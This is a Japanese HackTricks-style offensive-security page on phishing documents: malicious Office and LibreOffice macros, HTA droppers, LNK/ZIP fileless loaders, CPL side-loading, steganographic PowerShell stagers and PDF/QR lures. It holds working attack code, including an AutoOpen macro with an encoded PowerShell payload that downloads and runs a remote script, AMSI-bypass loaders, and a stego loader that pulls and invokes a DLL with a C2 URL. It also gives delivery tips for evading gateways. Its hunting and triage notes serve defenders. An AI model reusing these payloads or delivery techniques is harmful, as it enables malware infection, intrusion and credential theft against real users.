# フィッシングファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Officeドキュメント

Microsoft Wordはファイルを開く前に、ファイルデータの検証を行います。データ構造の識別という形式で、OfficeOpenXML標準に照らして検証されます。データ構造の識別中にエラーが発生すると、解析対象のファイルは開かれません。

通常、マクロを含むWordファイルには`.docm`拡張子が使われます。しかし、ファイル拡張子を変更して名前を変更しても、マクロを実行する機能を維持できます。\
たとえば、RTFファイルは設計上マクロをサポートしていませんが、DOCMファイルの拡張子をRTFに変更すると、Microsoft Wordで処理され、マクロを実行できます。\
同じ内部構造と仕組みは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に適用されます。

次のコマンドを使うと、一部のOfficeプログラムで実行される拡張子を確認できます。

```bash
assoc | findstr /i "word excel powerp"
```

DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can also “execute” macros.

### 外部画像の読み込み

移動先: _挿入 --> クイック パーツ --> フィールド_\
_**カテゴリ**: リンクと参照, **フィールド名**: includePicture, **ファイル名または URL**:_ http://<ip>/whatever

![Office Documents - 外部画像の読み込み: 移動先: 挿入 -- クイック パーツ -- フィールド](<../../images/image (155).png>)

### マクロのバックドア

マクロを使って、ドキュメントから任意のコードを実行できます。

#### 自動読み込み関数

一般的な関数ほど、AV に検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロコードの例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### メタデータを手動で削除する

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が開きます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これは、**`.docx` にはマクロを保存できず**、マクロ有効形式の **`.docm`** 拡張子には**抵抗感**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の Web／メールゲートウェイでは完全にブロックされます）。そのため、この**旧形式の `.doc` 拡張子が最善の妥協案**です。

#### Malicious Macros Generators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT の自動実行マクロ（Basic）

LibreOffice Writer のドキュメントには Basic マクロを埋め込むことができ、マクロを **Open Document** イベントにバインドすると、ファイルを開いたときに自動実行できます（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> シンプルな reverse shell マクロは次のようになります。

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

文字列内の二重引用符（`""`）に注意してください。LibreOffice Basic では、リテラルの引用符をエスケープするために使用されます。そのため、`...==""")` で終わる payload では、内側のコマンドと Shell 引数の両方で引用符の対応が取れています。

配信のヒント:

- `.odt` として保存し、開いたときにすぐ実行されるよう、マクロをドキュメントイベントに割り当てます。
- `swaks` でメールを送信する際は、`--attach @resume.odt` を使用します（ファイル名の文字列ではなく、ファイルのバイト列を添付するために `@` が必要です）。これは、任意の `RCPT TO` 宛先を検証せずに受け付ける SMTP サーバーを悪用する場合に重要です。

## HTA ファイル

HTA は、**HTML とスクリプト言語（VBScript や JScript など）を組み合わせた** Windows プログラムです。ユーザーインターフェースを生成し、ブラウザーのセキュリティモデルによる制約を受けずに「完全に信頼された」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使用して実行されます。通常、**Internet Explorer とともにインストール**されるため、**`mshta` は IE に依存します**。そのため、IE がアンインストールされている場合、HTA は実行できません。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM Authentication の強制

**リモートで**NTLM Authentication を**強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールや HTML に**非表示の画像**を追加できます（HTTP MitM でも可能？）。または、**フォルダーを開くだけで**Authentication を**トリガーする**ファイルの**アドレス**を被害者に送る方法もあります。

**以下のページで、これらのアイデアやその他の方法を確認してください:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash や Authentication を盗むだけでなく、**NTLM relay attacks を実行する**こともできる点を忘れないでください:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8（証明書へのNTLM relay）**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP に埋め込まれた Payload（fileless chain）

非常に効果的なキャンペーンでは、正規の囮文書（PDF/DOCX）2つと悪意のある .lnk を含む ZIP を配布します。仕掛けは、実際の PowerShell loader が一意の marker の後ろに ZIP の生バイト列として格納されており、.lnk がそこから切り出して、完全にメモリ上で実行することです。<sup>[[2]](#references)</sup>

.lnk の PowerShell one-liner で実装される一般的な流れ:

1) 一般的な場所（Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の作業ディレクトリの親ディレクトリ）から元の ZIP を探す。
2) ZIP のバイト列を読み込み、ハードコードされた marker（例: xFIQCV）を探す。marker より後ろのすべてが埋め込み PowerShell payload です。
3) ZIP を %ProgramData% にコピーして展開し、正規のファイルに見せかけるため、囮の .docx を開く。
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次の stage の難読化を解除し（例: すべての # 文字を削除）、メモリ上で実行する。

埋め込み stage を切り出して実行する PowerShell の基本形の例:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

メモ
- 配信では、評判の良いPaaSサブドメイン（例: *.herokuapp.com）が悪用されることが多く、payloadの配信を制限する場合もあります（IP/UAに応じて無害なZIPを配信）。
- 次の段階では、base64/XOR shellcodeを復号し、Reflection.Emit + VirtualAlloc経由で実行して、ディスク上の痕跡を最小限に抑えることがよくあります。

同じchainで使われるPersistence
- Microsoft Web Browser controlのCOM TypeLib hijackingにより、IE/Explorerや、このcontrolを埋め込んだアプリがpayloadを自動的に再起動するようにします。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使えるコマンドはこちら:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

ハンティング/IOCs
- アーカイブデータの末尾にASCIIマーカー文字列（例: xFIQCV）が追加されたZIPファイル。
- 親フォルダーやユーザーフォルダーを列挙してZIPを探し、囮文書を開く.lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailedによるAMSI tampering。
- 信頼されたPaaSドメイン上のリンクで終わる、長期間続く業務関連スレッド。

## LNKで囮を先に表示するstaging → scheduled-taskによるPersistence → 信頼されたCPLのside-loading

繰り返し確認されているパターンの1つは、**文書を装った`.lnk`**が、バックグラウンドで実際のchainを準備しながら、無害な誘導文書をすぐに開く手法です。<sup>[[3]](#references)</sup>

確認された手順:
1. ショートカットは**PDFを装い**、`conhost.exe`などのプロキシを使って、難読化されたPowerShell downloaderを起動します。
2. PowerShellはトークンを分割します（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）。そのため、`iwr`、`gci`、`ren`、`cpi`、`schtasks`を探す単純な検知ではコマンドを見逃します。
3. stagerはまず**囮文書をダウンロード**して被害者に開かせ、その後、バックグラウンドで悪意のあるファイルを復元します。
4. payloadは**偽装用の拡張子**で書き込まれ、後から余分な文字を取り除いてリネームされることがあります。これにより、明白な`.exe` / `.cpl`ファイルが現れるのを遅らせます。
5. ユーザーが書き込み可能なパスにある信頼されたホストバイナリを起動する、**分単位のscheduled task**によってPersistenceが確立されます。

このパターンを見つけるための最小限の手掛かり:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

認識しておくと役立つステージング構成:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` または `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 第2段階がステルス性に優れている理由

Rapid7の事例では、スケジュールタスクが `C:\Users\Public\` から **`Fondue.exe`** を繰り返し起動していました。**`APPWIZ.cpl`** がその隣に配置され、**`RunFODW`** をエクスポートしていたため、信頼されたMicrosoftのバイナリは正規のシステムコピーではなく、攻撃者のCPLをサイドロードしました。

そのCPLは次の処理を行います:
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** のblobを読み込む
- **Windows CNG / `bcrypt.dll`** 経由で復号する
- 実行可能メモリを割り当て、復号したshellcodeをコピーする
- shellcodeのポインターを **`EnumUILanguagesW`** のコールバックとして渡し、間接的に実行する

最後の手法は別途探す価値があります。マルウェアは、`((void(*)())buf)()` のような直接ジャンプを避け、代わりに **コールバックを受け取る正規のWinAPI** を悪用して実行を移すことがよくあります。

このキャンペーンで復号されたペイロードは **Donut** shellcodeで、最終的なPEをすべてメモリ上にマッピングし、実行を引き渡す前に現在のプロセス内で **AMSI/WLDP/ETW** にパッチを適用しました。サイドローディングとメモリ常駐型の後処理に関する詳しい情報は、こちらを参照してください:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

調査に役立つ実践的な手がかり:
- `.lnk` が `powershell.exe` または `conhost.exe` を起動し、その後、目に見える囮文書が表示される。
- `C:\Users\Public\` への短時間のダウンロード後、意味のない拡張子からすぐに名前が変更される。
- `GoogleErrorReport` のような無難な名前のスケジュールタスクが、**ユーザーが書き込み可能なディレクトリ**から実行される。
- 信頼されたバイナリが、同じ非システムディレクトリから **`.cpl` / `.dll`** ファイルを読み込む。
- **`C:\Windows\Tasks\`** にBase64テキストのblobが書き込まれ、その後サイドロードされたモジュールによって読み込まれる。

## 画像内のステガノグラフィ区切りペイロード (PowerShell stager)

最近のloader chainでは、難読化されたJavaScript/VBSが配布され、そこからBase64のPowerShell stagerをデコードして実行します。このstagerは画像 (多くの場合GIF) をダウンロードします。画像には、固有の開始/終了マーカーの間に、プレーンテキストとしてBase64エンコードされた.NET DLLが隠されています。スクリプトはこれらの区切り文字 (実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>») を検索し、間のテキストを抽出してBase64をバイト列にデコードし、アセンブリをメモリ上にロードして、C2 URLを指定して既知のエントリメソッドを呼び出します。<sup>[[5]](#references)</sup>

ワークフロー
- Stage 1: アーカイブされたJS/VBS dropper → 埋め込まれたBase64をデコード → -nop -w hidden -ep bypass を指定してPowerShell stagerを起動。
- Stage 2: PowerShell stager → 画像をダウンロードし、マーカーで区切られたBase64を切り出して.NET DLLをメモリ上にロードし、C2 URLとオプションを渡してそのメソッド (例: VAI) を呼び出す。
- Stage 3: Loaderが最終ペイロードを取得し、通常はprocess hollowingを使って信頼されたバイナリ (一般的にはMSBuild.exe) にインジェクトする。<sup>[[7]](#references)[[8]](#references)</sup> process hollowingと信頼されたユーティリティを介したproxy executionについては、こちらを参照してください:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像からDLLを切り出し、メモリ上で.NETメソッドを呼び出すPowerShellの例:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と文字列の難読化解除は、アセンブリの読み込み前によく行われます。
- ハンティング: ダウンロードされた画像を既知の区切り文字でスキャンし、画像にアクセスしてすぐにBase64 blobをデコードするPowerShellを特定します。

stegoツールとcarving手法も参照してください:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し確認されている初期ステージは、アーカイブ内に含まれる小さく高度に難読化された `.js` または `.vbs` です。その唯一の目的は、埋め込まれたBase64文字列をデコードし、`-nop -w hidden -ep bypass` を付けてPowerShellを起動し、HTTPS経由で次のステージを開始することです。<sup>[[5]](#references)</sup>

骨格となるロジック（概略）:
- 自身のファイル内容を読み込む
- ジャンク文字列の間にあるBase64 blobを見つける
- ASCII形式のPowerShellにデコードする
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

ハンティングの手掛かり
- アーカイブ内のJS/VBS添付ファイルが、コマンドラインに `-enc`/`FromBase64String` を含む `powershell.exe` を起動する。
- `wscript.exe` がユーザーの一時パスから `powershell.exe -nop -w hidden` を起動する。

## 実行コンテナとしてのMSCドキュメント (GrimResource)

Microsoft Management Consoleファイル（`.msc`）は、通常 `mmc.exe` で開かれるXMLコンソール定義です。**GrimResource** は、古いXSSプリミティブを含む `apds.dll` リソースへの `StringTable` 参照を悪用します。そのため、細工されたコンソールをユーザーが開くと、JavaScriptが `mmc.exe` 内で実行されます。確認されたサンプルでは、`transformNode` ベースの難読化と **DotNetToJScript** を組み合わせ、通常のOfficeマクロ経由ではなく.NET payloadをインスタンス化していました。<sup>[[9]](#references)</sup>

静的トリアージでは、信頼できないMSCをテキストとして扱い、**ダブルクリックしないでください**。<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高シグナルな実行時のピボットには、`mmc.exe` による CLR またはスクリプトコンポーネントの読み込み、ネットワーク接続の確立、`powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`、または予期しない実行ファイルの起動があります。この形式自体は正規のものなので、すべての MSC をブロックするのではなく、**送信元 + 不審な XML/スクリプトの内容 + `mmc.exe` の動作**を関連付けて検知してください。<sup>[[9]](#references)</sup>

## PDF/QR リダイレクターとペイロードのゲーティング

PDF は、悪用しなくても有用な攻撃手段になります。最近のキャンペーンでは、無害そうな文書に**QR コードや通常のリンク**を配置し、ブラウザーセッションをメールの保護機能から切り離して、受信者のアドレスに応じて遷移先を個別化しています。Microsoft は、受信者ごとに異なる QR URL が記載され、RaccoonO365 の認証情報窃取インフラへ誘導する 2025 年の PDF を報告しました。また、関連する別の攻撃チェーンでは、IP/環境によるゲーティングを使い、選定された訪問者には JavaScript/MSI のパスを返す一方、スキャナーや許可されていないクライアントには無害な PDF を返していました。<sup>[[10]](#references)</sup>

PDF のアクションと、レンダリングした QR コードの両方をトリアージしてください。QR コードは抽出可能な画像として保存されず、ベクター描画されている場合があるため、埋め込み画像を抽出するだけでなく、すべてのページをラスタライズしてください:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

隔離された分析システムから、認証せずにデコード後の宛先とリダイレクトを調査します。調査に役立つ特徴として、本文がほぼ空でQRコードのみを含むPDF、クエリパラメーターに埋め込まれた受信者のメールアドレス、信頼性の高いホスティングサービスを経由する複数のリダイレクト、IPアドレス、位置情報、Cookie、リファラー、User-Agentに応じて異なるコンテンツが返されることなどがあります。制御したプロファイルでリクエストを比較してください。単一のサンドボックスによる取得では、おとりしか受信できない場合があります。<sup>[[10]](#references)</sup>

## NTLMハッシュを盗むためのWindowsファイル

**NTLM credsを盗む場所**のページを確認してください。

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOfficeマクロ → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：米国企業を標的とする高度なフィッシング攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：中国をテーマにしたLoader Chainを通じてDropping Elephantの手口を追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新しいCOM永続化手法 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loaderがさまざまな情報窃取型マルウェアを配布](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – ステガノグラフィ (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – プロセスハロウイング (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 信頼された開発者ユーティリティのプロキシ実行：MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：初期アクセスと回避にMicrosoft Management Consoleを利用](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 脅威アクターが納税シーズンを利用して税関連のフィッシングキャンペーンを展開](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
